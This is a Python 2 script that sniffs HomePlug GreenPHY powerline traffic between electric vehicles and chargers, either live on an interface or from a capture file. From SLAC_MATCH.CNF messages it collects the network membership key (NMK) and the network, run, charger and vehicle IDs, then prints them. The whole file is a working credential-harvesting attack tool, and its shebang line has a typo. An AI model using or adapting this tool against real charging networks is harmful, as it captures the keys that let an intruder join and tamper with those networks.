#!/usr/bin/en python2

import sys
import pprint
import binascii
from layerscapy.HomePlugGP import *
from optparse import OptionParser

dictio = {}
pp = pprint.PrettyPrinter(depth=6)

def appendindic(pkt):
    """
        Process SLAC_MATCH.CNF messages
    """
    varfield = pkt['CM_SLAC_MATCH_CNF'].VariableField
    nmk = varfield.NMK
    netid = varfield.NetworkID
    runid = varfield.RunID
    evseid = varfield.EVSEID
    evid = varfield.EVID

    if netid not in dictio:
        newentry = {    "NMK" : nmk,
                        "RunID" : runid,
                        "EVSEID" : evseid,
                        "EVID" : evid,
                }
        dictio[netid] = newentry
        print "[+] New keys collected for NetID (%s)" % repr(netid)
        pp.pprint(newentry)

if __name__ == "__main__":
    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage)
    parser.add_option("-i", "--iface", dest="iface", default=None,
        help="Select an interface to sniff keys (doesn't work when capture option is used).", metavar="INTERFACE")
    parser.add_option("-c", "--capture", dest="capture", default=None,
        help="Select a capture file to collect keys.", metavar="CAPTURE")
    (options, args) = parser.parse_args()
    if options.capture is not None and options.iface is None:
        print "[+] Reading capture '%s'" % options.capture
        r = rdpcap(options.capture)
        for i in r:
            if i.haslayer("CM_SLAC_MATCH_CNF"):
                appendindic(i)
    elif options.iface is not None and options.capture is None:
        print "Sniffing on interface '%s'" % options.iface
        sniff(prn=appendindic, lfilter=lambda pkt:pkt.haslayer("CM_SLAC_MATCH_CNF")) 
    else:
        print "No option selected!"
